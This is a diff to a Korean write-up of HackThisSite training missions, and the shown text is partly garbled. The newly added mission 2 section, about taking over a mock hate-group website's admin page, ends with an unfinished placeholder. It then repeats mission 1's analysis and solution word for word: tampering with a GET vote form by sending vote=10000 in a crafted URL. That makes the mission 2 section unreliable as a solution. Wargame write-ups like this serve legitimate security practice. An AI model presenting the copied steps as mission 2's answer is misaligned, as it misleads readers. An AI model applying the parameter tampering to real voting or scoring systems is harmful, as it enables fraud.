@@ -6,7 +6,7 @@
 Your friend is being cheated out of hundreds of dollars. Help him make things even again!
 ```
 ### 문제 원본
-```
+```text
 From: HeavyMetalRyan 
 
 Message: Hey man, I need a big favour from you. Remember that website I showed you once before? Uncle Arnold's Band Review Page? Well, a long time ago I made a $500 bet with a friend that my band would be at the top of the list by the end of the year. Well, as you already know, two of my band members have died in a horrendous car accident... but this ass hole still insists that the bet is on!
@@ -51,3 +51,51 @@ http://www.hackthissite.org/missions/realistic/1/v.php
 ```
 - 위 주소를 브라우저 주소창에 입력하여 점수를 한번에 10000점을 전송하여 해결!
 
+
+## Chicago American Nazi Party
+```text
+Racist pigs are organizing an 'anti-immigrant' rally in Chicago. Help anti-racist activists take over their website!
+```
+### 문제 원본
+```text
+From: DestroyFascism 
+
+Message: I have been informed that you have quite admirable hacking skills. Well, this racist hate group is using their website to organize a mass gathering of ignorant racist bastards. We cannot allow such bigoted aggression to happen. If you can gain access to their administrator page and post messages to their main page, we would be eternally grateful.
+```
+
+### 문제 요약
+- [Racist hate group's website](https://www.hackthissite.org/missions/realistic/2/)의 admin 페이지 접속 권한을 얻어서 메인 페이지에 메시지를 올려다오.
+
+### 문제 분석
+
+₩~여기부터~~
+- 점수를 1~5 사이로 선택하고 vote! 를 클릭하면 점수가 올라간다.
+- 투표를 여러번 하는 것은 가능한데 이것이 반영되지는 않는다.
+- 'Imposing Republic' 라는 밴드가 최상단에 있는데 평균 평점은 23.107846155906 점이다. 1~5점 사이인데 이 밴드 점수도 이상하다.
+- 아무리 5점을 무한대로 눌러줘도 'Imposing Republic' 밴드의 평점을 넘어설 수는 없다. (평점이 5점이 넘으므로)
+
+### 문제 해결
+
+#### 소스코드보기로 확인해보니 점수를 부과하는 소스코드는 다음과 같다.
+```html
+    <form action="v.php" method="get">
+      <input type="hidden" name="PHPSESSID" value="abcaeadfc31a5c43b2534bf995c0553f" />
+      <input type="hidden" name="id" value="3" />
+      <select name="vote">
+        <option value="1">1</option>
+        <option value="2">2</option>
+        <option value="3">3</option>
+        <option value="4">4</option>
+        <option value="5">5</option>
+      </select>
+      <input type="submit" value="vote!" />
+    </form>
+```
+#### "GET" 방식으로 form을 전송하므로 이를 변조하여 점수를 전송해본다.
+```
+http://www.hackthissite.org/missions/realistic/1/v.php
+?PHPSESSID=abcaeadfc31a5c43b2534bf995c0553f
+&id=3
+&vote=10000
+```
+- 위 주소를 브라우저 주소창에 입력하여 점수를 한번에 10000점을 전송하여 해결!
